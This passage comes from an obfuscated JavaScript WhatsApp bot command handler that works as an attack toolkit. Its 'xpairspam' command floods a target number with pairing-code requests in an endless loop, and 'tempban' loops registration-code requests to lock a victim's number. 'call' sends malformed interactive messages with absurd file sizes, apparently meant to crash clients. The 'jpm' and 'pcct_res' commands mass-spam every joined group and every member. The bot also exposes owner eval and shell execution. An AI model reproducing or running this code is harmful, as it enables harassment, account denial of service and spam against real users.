            await _0x8fddfa.groupParticipantsUpdate(_0x4678cc.chat, [_0x53cee5], "demote");
            _0xb7106b(mess.done);
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "hidetag":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0x2f1e33) {
              return _0xb7106b(mess.notadmin);
            }
            if (!_0xb1d3ee) {
              return _0xb7106b(mess.admin);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            _0x8fddfa.sendMessage(_0x4678cc.chat, {
              text: q ? q : "",
              mentions: _0x121d5a.map(_0x1e377e => _0x1e377e.id)
            }, {
              quoted: _0x4678cc
            });
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "tagall":
          {
            if (!_0x5a4663) {
              return _0xb7106b(mess.ingroup);
            }
            if (!_0xb1d3ee) {
              return _0xb7106b(mess.admin);
            }
            await _0x1ddb27(_0x4678cc.chat, "🔁");
            let _0x22daa3 = "─── ▻ [ *Tag All* ] ◅ ───\n\n ⬡ *Message : " + (q ? q : "empty") + "*\n\n";
            for (let _0x400658 of _0x121d5a) {
              _0x22daa3 += "▢ @" + _0x400658.id.split[0] + "\n";
            }
            _0x8fddfa.sendMessage(_0x4678cc.chat, {
              text: _0x22daa3,
              mentions: _0x121d5a.map(_0x4962e8 => _0x4962e8.id)
            }, {
              quoted: _0x4678cc
            });
            await _0x1ddb27(_0x4678cc.chat, "✅");
          }
          break;
        case "atk":
          {
            if (!_0x4bc4e8) {
              return;
            }
            const _0x516fac = {
              image: _0x2d9836
            };
            const _0x3b5e9d = {
              upload: _0x8fddfa.waUploadToServer
            };
            let _0x5c411f = await prepareWAMessageMedia(_0x516fac, _0x3b5e9d);
            let _0x5bf69a = Object.values(await _0x8fddfa.groupFetchAllParticipating().catch(_0x4ddd3f => null));
            let _0x54e11a = [];
            await _0x5bf69a.forEach((_0x2ae13c, _0x554550) => {
              let _0x369834 = {
                header: _0x2ae13c.subject,
                title: "Attack Group | Status - ( " + (_0x2ae13c.announce == true ? "Group Closed" : "Group Open") + " )",
                id: ".getview " + _0x2ae13c.id
              };
              _0x54e11a.push(_0x369834);
            });
            const _0x55798b = {
              ..._0x5c411f
            };
            _0x55798b.hasMediaAttachment = true;
            var _0x8d11b5 = generateWAMessageFromContent(_0x4678cc.chat, proto.Message.fromObject({
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: _0x55798b,
                    body: {
                      text: "  - # Last Version Execution"
                    },
                    footer: {
                      text: "! Select the group to execute "
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "Powered By Last Version",
                          sections: [{
                            title: "Only Open groups can be Executed",
                            rows: _0x54e11a
                          }]
                        })
                      }],
                      messageParamsJson: ""
                    }
                  }
                }
              }
            }), {
              userJid: _0x4678cc.chat,
              quoted: _0x4678cc
            });
            _0x8fddfa.relayMessage(_0x4678cc.chat, _0x8d11b5.message, {
              messageId: _0x8d11b5.key.id
            });
          }
          break;
        case "pushkontak":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q) {
              return _0xb7106b("*Example : " + (_0x2fafb3 + _0x4db331) + " ngab, save ryo*");
            }
            const _0x416788 = {
              image: _0x2d9836
            };
            const _0x49b225 = {
              upload: _0x8fddfa.waUploadToServer
            };
            let _0x5d5e33 = await prepareWAMessageMedia(_0x416788, _0x49b225);
            let _0x468365 = Object.values(await _0x8fddfa.groupFetchAllParticipating().catch(_0x15dd68 => null));
            let _0x559ccd = [];
            _0x468365.forEach((_0x20a31b, _0x343c88) => {
              let _0x28f31b = {
                header: _0x20a31b.subject,
                title: "#Push - Contact | Status - ( " + (_0x20a31b.announce == true ? "Group Closed" : "Group Open") + " )",
                id: ".adddelay_1 " + _0x20a31b.id + "|" + q
              };
              _0x559ccd.push(_0x28f31b);
            });
            const _0x1e69d2 = {
              ..._0x5d5e33
            };
            _0x1e69d2.hasMediaAttachment = true;
            var _0x8d11b5 = generateWAMessageFromContent(_0x4678cc.chat, proto.Message.fromObject({
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: _0x1e69d2,
                    body: {
                      text: "  - # Last Version - Push Contact"
                    },
                    footer: {
                      text: "! Select a group to Push Ctt to that group !!"
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "Powered By Last Version",
                          sections: [{
                            title: "Only Open groups can be Push Contact",
                            rows: _0x559ccd
                          }]
                        })
                      }],
                      messageParamsJson: ""
                    }
                  }
                }
              }
            }), {
              userJid: _0x4678cc.chat,
              quoted: _0x4678cc
            });
            _0x8fddfa.relayMessage(_0x4678cc.chat, _0x8d11b5.message, {
              messageId: _0x8d11b5.key.id
            });
          }
          break;
        case "mmq":
          {
            _0x4678cc.reply("k" + q);
          }
          break;
        case "adddelay_1":
          {
            if (!_0x4bc4e8) {
              return;
            }
            let [_0x9ad7b0, _0x3ffa30] = q.split("|");
            _0x8fddfa.relayMessage(_0x4678cc.chat, {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: {
                      hasMediaAttachment: false
                    },
                    body: {
                      text: "  Push - Contact 2nd Phase"
                    },
                    footer: {
                      text: "! Select a delay Tiime For PushCtt !!"
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "Powered By Last Version",
                          sections: [{
                            title: "Only Open groups can be Push Contact",
                            rows: [{
                              header: "# 1 ( One ) Second",
                              title: "Timestap --> 1000 ( milisecond )",
                              id: ".pcct_res 1000|" + _0x9ad7b0 + "|" + _0x3ffa30
                            }, {
                              header: "# 2 ( Two ) Second",
                              title: "Timestamp --> 2000 ( milisecond )",
                              id: ".pcct_res 2000|" + _0x9ad7b0 + "|" + _0x3ffa30
                            }, {
                              header: "# 3 ( Three ) Second",
                              title: "Timestamp --> 3000 ( milisecond )",
                              id: ".pcct_res 3000|" + _0x9ad7b0 + "|" + _0x3ffa30
                            }, {
                              header: "# 4 ( four ) Second",
                              title: "Timestamp --> 4000 ( milisecond )",
                              id: ".pcct_res 4000|" + _0x9ad7b0 + "|" + _0x3ffa30
                            }, {
                              header: "# 5 ( Five ) Second",
                              title: "Timestamp --> 5000 ( milisecond )",
                              id: ".pcct_res 5000|" + _0x9ad7b0 + "|" + _0x3ffa30
                            }, {
                              header: "# 6 ( Six ) Second",
                              title: "Timestap --> 6000 ( milisecond )",
                              id: ".pcct_res 6000|" + _0x9ad7b0 + "|" + _0x3ffa30
                            }, {
                              header: "# 7 ( Seven ) Second",
                              title: "Timestamp --> 7000 ( milisecond )",
                              id: ".pcct_res 7000|" + _0x9ad7b0 + "|" + _0x3ffa30
                            }]
                          }]
                        })
                      }],
                      messageParamsJson: ""
                    }
                  }
                }
              }
            }, {});
          }
          break;
        case "pcct_res":
          {
            if (!_0x4bc4e8) {
              return;
            }
            let [_0x1e32d6, _0x1e71c4, _0x663018] = q.split("|");
            if (!_0x1e32d6 && !_0x1e71c4 && !_0x663018) {
              _0xb7106b("Not like that, idiot, like this : \n*" + (_0x2fafb3 + _0x4db331) + " 1000|idgc|text*");
            }
            let _0x54a14c = await _0x8fddfa.groupMetadata(_0x1e71c4);
            let _0x42a2a2 = _0x54a14c.participants;
            for (let _0x736e4 of _0x42a2a2) {
              const _0xb5162f = {
                text: _0x663018
              };
              const _0x1255af = {
                extendedTextMessage: _0xb5162f
              };
              var _0x8d11b5 = generateWAMessageFromContent(_0x736e4.id.split("@")[0] + "@s.whatsapp.net", proto.Message.fromObject(_0x1255af), {
                userJid: _0x736e4.id.split("@")[0] + "@s.whatsapp.net",
                quoted: _0x375c9a
              });
              await _0x8fddfa.relayMessage(_0x736e4.id.split("@")[0] + "@s.whatsapp.net", _0x8d11b5.message, {
                participant: {
                  jid: _0x736e4.id.split("@")[0] + "@s.whatsapp.net"
                },
                messageId: _0x8d11b5.key.id
              });
              await _0xa791c(_0x1e32d6);
            }
          }
          break;
        case "jpmhidetag":
        case "jpmht":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!_0x1b2127 && !_0x4678cc.quoted) {
              return _0xb7106b("Example : \n\n*" + (_0x2fafb3 + _0x4db331) + " selling dick for 5k, interested? pm*");
            }
            var _0x2ee909 = _0x4678cc.quoted ? _0x4678cc.quoted.text : _0x1b2127;
            let _0xb83f8f = 0;
            let _0x39f58d = await _0x8fddfa.groupFetchAllParticipating();
            let _0x3f58ab = await Object.keys(_0x39f58d);
            let _0x375068 = _0x4678cc.chat;
            await _0xb7106b("*Processing Jpm ⏳*\n\n* Type : *Text & Hidetag*\n* Total Grup : *" + _0x3f58ab.length + " Grup*");
            var _0x295bb1 = [];
            const _0x2c4868 = {
              text: _0x2ee909
            };
            const _0x194aa6 = {
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"Buy Product\",\"url\":\"https://wa.me/" + ownMain + "\",\"merchant_url\":\"https://www.google.com\"}"
            };
            let _0x5abe5d = await generateWAMessageFromContent(_0x4678cc.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create(_0x2c4868),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [_0x194aa6, {
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Testimonial\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Join Group\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }]
                    })
                  })
                }
              }
            }, {
              userJid: _0x4678cc.sender,
              quoted: _0x375c9a
            });
            for (let _0x5e24bc of _0x3f58ab) {
              try {
                _0x295bb1 = _0x39f58d[_0x5e24bc].participants.map(_0x495bcc => _0x495bcc.id);
                await _0x8fddfa.relayMessage(_0x5e24bc, _0x5abe5d.message, {
                  messageId: _0x5abe5d.key.id
                });
                _0xb83f8f += 1;
              } catch (_0x101eb5) {
                console.log(_0x101eb5);
              }
              await _0xa791c(global.delayjpm);
            }
            await _0xb7106b("*Jpm Succeeded ✅* Total Groups Successfully Sent Messages to *" + _0xb83f8f + " Grup*");
          }
          break;
        case "jpmhidetag2":
        case "jpmht2":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!_0x1b2127) {
              return _0xb7106b("Example : \n\n" + (_0x2fafb3 + _0x4db331) + " selling dick for 5k, interested? pm");
            }
            if (!/image/.test(_0x2bf9d0)) {
              return _0xb7106b("Example : \n\n*" + (_0x2fafb3 + _0x4db331) + " selling dick for 5k, interested? pm*\n\nNote : reply to the image you want to use with the text");
            }
            const _0x599136 = await _0x8fddfa.downloadAndSaveMediaMessage(_0x3d54f1);
            var _0x2ee909 = _0x1b2127;
            const _0x514a74 = _0x4678cc.chat;
            let _0x10fa7f = 0;
            let _0x106449 = await _0x8fddfa.groupFetchAllParticipating();
            let _0x8dc5cf = await Object.keys(_0x106449);
            await _0xb7106b("*Processing Jpm ⏳*\n\n* Type : *Hidetag Text & Photo*\n* Total Grup : *" + _0x8dc5cf.length + " Grup*");
            var _0x295bb1 = [];
            const _0x522ea2 = {
              text: _0x2ee909
            };
            const _0x2c45ac = {
              upload: _0x8fddfa.waUploadToServer
            };
            let _0x4a660b = generateWAMessageFromContent(_0x4678cc.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create(_0x522ea2),
                    header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia({
                        image: await fs.readFileSync(_0x599136)
                      }, _0x2c45ac))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Buy Product\",\"url\":\"https://wa.me/" + ownMain + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Testimonial\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Join Grup\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }]
                    })
                  })
                }
              }
            }, {
              userJid: _0x4678cc.sender,
              quoted: _0x375c9a
            });
            for (let _0x507ab4 of _0x8dc5cf) {
              try {
                _0x295bb1 = _0x106449[_0x507ab4].participants.map(_0x4e4cb5 => _0x4e4cb5.id);
                await _0x8fddfa.relayMessage(_0x507ab4, _0x4a660b.message, {
                  messageId: _0x4a660b.key.id
                });
                _0x10fa7f += 1;
              } catch (_0x2b9b77) {
                console.log(_0x2b9b77);
              }
              await _0xa791c(global.delayjpm);
            }
            await fs.unlinkSync(_0x599136);
            await _0xb7106b("*Jpm Succeeded ✅*\nTotal Groups Successfully Sent Messages to *" + _0x10fa7f + " Grup*");
          }
          break;
        case "jpm":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!_0x1b2127) {
              return _0xb7106b("Example : \n\n" + (_0x2fafb3 + _0x4db331) + " selling dick for 5k, interested? pm");
            }
            var _0x2ee909 = _0x4678cc.quoted ? _0x4678cc.quoted.text : _0x1b2127;
            let _0x533630 = 0;
            const _0x18f592 = _0x4678cc.chat;
            let _0x5bc982 = await _0x8fddfa.groupFetchAllParticipating();
            let _0x336751 = await Object.keys(_0x5bc982);
            await _0xb7106b("*Processing Jpm ⏳*\n\n* Type : *Text*\n* Total Grup : *" + _0x336751.length + " Grup*");
            const _0x536d6a = {
              text: _0x2ee909
            };
            let _0x496f58 = generateWAMessageFromContent(_0x4678cc.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create(_0x536d6a),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Buy Product\",\"url\":\"https://wa.me/" + ownMain + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Testimonial\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Join Grup\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }]
                    })
                  })
                }
              }
            }, {
              userJid: _0x4678cc.sender,
              quoted: _0x375c9a
            });
            for (let _0x28aa1a of _0x336751) {
              try {
                await _0x8fddfa.relayMessage(_0x28aa1a, _0x496f58.message, {
                  messageId: _0x496f58.key.id
                });
                _0x533630 += 1;
              } catch {}
              await _0xa791c(global.delayjpm);
            }
            await _0xb7106b("*Jpm Succeeded ✅*\nTotal Groups Successfully Sent Messages *" + _0x533630 + " Grup*");
          }
          break;
        case "jpm2":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!_0x1b2127) {
              return _0xb7106b("Example : \n\n" + (_0x2fafb3 + _0x4db331) + " selling dick for 5k, interested? pm");
            }
            if (!/image/.test(_0x2bf9d0)) {
              return _0xb7106b("Example : \n\n*" + (_0x2fafb3 + _0x4db331) + " selling dick for 5k, interested? pm*\n\nNote : reply to the image you want to use with the text");
            }
            let _0x2cc80b = await _0x8fddfa.downloadAndSaveMediaMessage(_0x3d54f1);
            let _0x31ab91 = 0;
            const _0x3dfc0e = _0x4678cc.chat;
            let _0x52ea4b = await _0x8fddfa.groupFetchAllParticipating();
            let _0x537c52 = await Object.keys(_0x52ea4b);
            await _0xb7106b("*Processing Jpm ⏳*\n\n* Type : *Text & Foto*\n* Total Grup : *" + _0x537c52.length + " Grup*");
            const _0x69258a = {
              text: _0x1b2127
            };
            const _0x510701 = {
              upload: _0x8fddfa.waUploadToServer
            };
            const _0x45da7e = {
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"Buy Product\",\"url\":\"https://wa.me/" + ownMain + "\",\"merchant_url\":\"https://www.google.com\"}"
            };
            let _0x298f61 = generateWAMessageFromContent(_0x4678cc.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create(_0x69258a),
                    header: proto.Message.InteractiveMessage.Header.create({
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia({
                        image: await fs.readFileSync(_0x2cc80b)
                      }, _0x510701))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [_0x45da7e, {
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Testimonial\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }, {
                        name: "cta_url",
                        buttonParamsJson: "{\"display_text\":\"Join Grup\",\"url\":\"" + global.linkgc + "\",\"merchant_url\":\"https://www.google.com\"}"
                      }]
                    })
                  })
                }
              }
            }, {
              userJid: _0x4678cc.sender,
              quoted: _0x375c9a
            });
            for (let _0x12ff09 of _0x537c52) {
              try {
                await _0x8fddfa.relayMessage(_0x12ff09, _0x298f61.message, {
                  messageId: _0x298f61.key.id
                });
                _0x31ab91 += 1;
              } catch {}
              await _0xa791c(global.delayjpm);
            }
            await fs.unlinkSync(_0x2cc80b);
            await _0xb7106b("*Jpm Berhasil ✅*\nTotal Groups Successfully Sent Messages to *" + _0x31ab91 + " Grup*");
          }
          break;
        case "tiktok":
        case "tt":
          {
            if (!q) {
              await _0xb7106b("Example : *" + (_0x2fafb3 + _0x4db331) + " https://vt.tiktok.com/ZSYbo5umU/.*");
              await _0x1ddb27(_0x4678cc.chat, "❗");
            }
            if (!/tiktok.com/.test(q)) {
              return _0xb7106b("*Link Invalid !*");
            }
            _0xb7106b(mess.wait);
            let _0x2020b3 = q;
            await fg.tiktok(_0x2020b3).then(async _0x3d54f4 => {
              var _0x17d957 = global.ownername;
              if (_0x3d54f4.result.duration == 0) {
                if (_0x3d54f4.result.images.length > 1) {
                  let _0x41cce8 = new Array();
                  let _0x1aeb8a = 0;
                  for (let _0x49cd78 of _0x3d54f4.result.images) {
                    const _0x5e6bad = {
                      upload: _0x8fddfa.waUploadToServer
                    };
                    let _0x5b0f2f = await prepareWAMessageMedia({
                      image: await fetch("" + _0x49cd78)
                    }, _0x5e6bad);
                    const _0x392a17 = {
                      title: "Slide To Photo *" + (_0x1aeb8a += 1) + "*",
                      hasMediaAttachment: true,
                      ..._0x5b0f2f
                    };
                    const _0x29ea2c = {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"Photo Link\",\"url\":\"" + _0x49cd78 + "\",\"merchant_url\":\"https://www.google.com\"}"
                    };
                    const _0x5417db = {
                      buttons: [_0x29ea2c]
                    };
                    const _0x58346a = {
                      text: namabot
                    };
                    const _0x1c4467 = {
                      header: _0x392a17,
                      nativeFlowMessage: _0x5417db,
                      footer: _0x58346a
                    };
                    await _0x41cce8.push(_0x1c4467);
                  }
                  const _0x4cc9c2 = {
                    cards: _0x41cce8
                  };
                  const _0x5de264 = {
                    body: {
                      text: "Tiktok Slide Result"
                    },
                    carouselMessage: _0x4cc9c2
                  };
                  const _0x5e5b4e = {
                    interactiveMessage: _0x5de264
                  };
                  const _0x3073f5 = {
                    message: _0x5e5b4e
                  };
                  const _0x365824 = {
                    viewOnceMessage: _0x3073f5
                  };
                  const _0x5c7ca4 = await generateWAMessageFromContent(_0x4678cc.chat, _0x365824, {
                    userJid: _0x4678cc.sender,
                    quoted: _0x4678cc
                  });
                  await _0x8fddfa.relayMessage(_0x4678cc.chat, _0x5c7ca4.message, {
                    messageId: _0x5c7ca4.key.id
                  });
                  await _0x1ddb27(_0x4678cc.chat, "✅");
                } else {
                  const _0x56bd62 = {
                    url: result.data.images[0]
                  };
                  const _0x3a8ded = {
                    image: _0x56bd62,
                    caption: _0x17d957
                  };
                  _0x8fddfa.sendMessage(_0x4678cc.chat, _0x3a8ded, {
                    quoted: _0x4678cc
                  });
                }
              } else {
                const _0x144aef = {
                  upload: _0x8fddfa.waUploadToServer
                };
                let _0x530596 = await prepareWAMessageMedia({
                  video: await fetch("" + _0x3d54f4.result.play)
                }, _0x144aef);
                const _0x56b3c7 = {
                  text: _0x17d957
                };
                const _0x424da8 = {
                  hasMediaAttachment: true,
                  ..._0x530596
                };
                const _0x2ecbf2 = {
                  name: "cta_url",
                  buttonParamsJson: "{\"display_text\":\"Link Video\",\"url\":\"" + q + "\",\"merchant_url\":\"https://www.google.com\"}"
                };
                const _0x48de80 = {
                  buttons: [_0x2ecbf2]
                };
                let _0x1d95f4 = await generateWAMessageFromContent(_0x4678cc.chat, {
                  viewOnceMessage: {
                    message: {
                      interactiveMessage: {
                        contextInfo: {
                          mentionedJid: [_0x4678cc.sender]
                        },
                        body: _0x56b3c7,
                        header: _0x424da8,
                        nativeFlowMessage: _0x48de80
                      }
                    }
                  }
                }, {
                  userJid: _0x4678cc.sender,
                  quoted: _0x4678cc
                });
                await _0x8fddfa.relayMessage(_0x4678cc.chat, _0x1d95f4.message, {
                  messageId: _0x1d95f4.key.id
                });
                await _0x1ddb27(_0x4678cc.chat, "✅");
              }
            }).catch(_0x148a5e => _0xb7106b("" + _0x148a5e));
          }
          break;
        case "xpairspam":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q) {
              return _0xb7106b("Example : \n\n*" + (_0x2fafb3 + _0x4db331) + " +62 882-2132-5473*");
            }
            await _0x1ddb27(_0x4678cc.chat, "✅");
            let _0x10a911 = q.replace(/[^0-9]/g, "").trim();
            let {
              default: _0x339e05,
              useMultiFileAuthState: _0x4b2b92,
              fetchLatestBaileysVersion: _0xd04612
            } = require("@whiskeysockets/baileys");
            let {
              state: _0x11598e
            } = await _0x4b2b92("pepek");
            let {
              version: _0x1f5df5
            } = await _0xd04612();
            const _0x9e1ed3 = {
              level: "fatal"
            };
            let _0x131d0e = await _0x339e05({
              auth: _0x11598e,
              version: _0x1f5df5,
              logger: pino(_0x9e1ed3)
            });
            while (true) {
              for (let _0x3370d6 = 0; _0x3370d6 < 48; _0x3370d6++) {
                await _0xa791c(1000);
                let _0x30a844 = await _0x131d0e.requestPairingCode(_0x10a911);
                await console.log("# Succes Spam Pairing Code - Number : " + _0x10a911 + " - Code : " + _0x30a844);
              }
              await _0xa791c(15000);
            }
          }
          break;
        case "tempban":
          {
            if (!_0x18189b) {
              return _0xb7106b(mess.prem);
            }
            if (!_0x1b2127) {
              return _0xb7106b("Example: " + (_0x2fafb3 + _0x4db331) + " 62|87872627288");
            }
            if (!/|/.test(_0x1b2127)) {
              return _0xb7106b("The data you provided is invalid!, Example: \n " + _0x4db331 + " 91|6909137213");
            }
            let _0x894201 = q.split("")[0];
            let _0x22328f = q.split("")[1];
            let _0x4f36b0 = _0x894201 + _0x22328f;
            await _0x1ddb27(_0x4678cc.chat, "✅");
            let {
              default: _0x5c0965,
              useMultiFileAuthState: _0x104a1d,
              fetchLatestBaileysVersion: _0x745981
            } = require("@whiskeysockets/baileys");
            let {
              state: _0x4fff5b
            } = await _0x104a1d("pepek");
            let {
              version: _0x1cf8b9
            } = await _0x745981();
            let _0x3ac0dd = await _0x5c0965({
              auth: _0x4fff5b,
              version: _0x1cf8b9,
              logger: pino({
                level: "fatal"
              })
            });
            while (true) {
              try {
                const _0x40f7b8 = {
                  phoneNumber: "+" + _0x4f36b0,
                  phoneNumberCountryCode: _0x894201,
                  phoneNumberNationalNumber: _0x22328f,
                  phoneNumberMobileCountryCode: 724
                };
                let _0x4603aa = await _0x3ac0dd.requestRegistrationCode(_0x40f7b8);
                if (_0x4603aa.reason === "temporarily_unavailable") {
                  console.log("Number Invalid (Possible Registration Interruption): +" + _0x4603aa.login);
                  await _0xa791c(400);
                }
              } catch (_0x3e6ae3) {
                console.error(_0x3e6ae3);
              }
            }
          }
          break;
        case "call":
          {
            if (!_0x4bc4e8) {
              return;
            }
            if (!q) {
              return _0xb7106b("Example : \n\n*" + (_0x2fafb3 + _0x4db331) + " 5*");
            }
            for (let _0x4e28a4 = 0; _0x4e28a4 < q; _0x4e28a4++) {
              await _0x8fddfa.relayMessage(_0x4678cc.chat, {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      header: {
                        ...(await _0x30c87e({
                          document: _0x1117bd,
                          fileName: " 🦄드림 가이 Xeon",
                          fileLength: "9999999999999",
                          pageCount: 9999999999999,
                          contactVcard: true,
                          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                          thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                          thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                          thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                          jpegThumbnail: await _0x1501c4(_0xbe48c0, 276, 100)
                        })),
                        title: "🦄드림 가이 Xeon",
                        hasMediaAttachment: true
                      },
                      body: {
                        text: ""
                      },
                      nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [{
                          name: "call_permission_request",
                          buttonParamsJson: "{}"
                        }, {
                          name: "galaxy_message",
                          buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"🦄드림 가이 Xeon\",\"flow_message_version\":\"9\",\"flow_token\":\"🦄드림 가이 Xeon\"}"
                        }]
                      }
                    }
                  }
                }
              }, {});
            }
          }
          break;
        default:
      }
    }
    if (_0x258907.startsWith("=>")) {
      if (!_0x4bc4e8) {
        return;
      }
      try {
        const _0x10997d = await eval("(async () => { return " + _0x258907.slice(3) + " })()");
        _0x4678cc.reply(util.format(_0x10997d));
      } catch (_0x5f3532) {
        _0x4678cc.reply(String(_0x5f3532));
      }
    }
    if (_0x258907.startsWith(">")) {
      if (!_0x4bc4e8) {
        return;
      }
      try {
        let _0x1613ad = await eval(_0x258907.slice(2));
        if (typeof _0x1613ad !== "string") {
          _0x1613ad = require("util").inspect(_0x1613ad);
        }
        await _0x4678cc.reply(_0x1613ad);
      } catch (_0x7acf1a) {
        await _0x4678cc.reply(String(_0x7acf1a));
      }
    }
    if (_0x258907.startsWith("$")) {
      if (!_0x4bc4e8) {
        return;
      }
      exec(_0x258907.slice(2), (_0x215d7f, _0x211fc3) => {
        if (_0x215d7f) {
          return _0x4678cc.reply(_0x215d7f.toString());
        }
        if (_0x211fc3) {
          return _0x4678cc.reply(_0x211fc3.toString());
        }
      });
    }
  } catch (_0x29d10d) {
    const _0x6568c9 = async () => {
      const _0x397c1c = {
        quoted: _0x4678cc
      };
      _0x8fddfa.sendMessage(global.ownMain + "@s.whatsapp.net", {
        text: require("util").format(_0x29d10d)
      }, _0x397c1c);
      new Promise(_0x4e7496 => setTimeout(_0x4e7496, 2000));
      console.log(util.format(_0x29d10d));
    };
    _0x6568c9();
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(color("Update " + __filename, "green"));
  delete require.cache[file];
  require(file);
});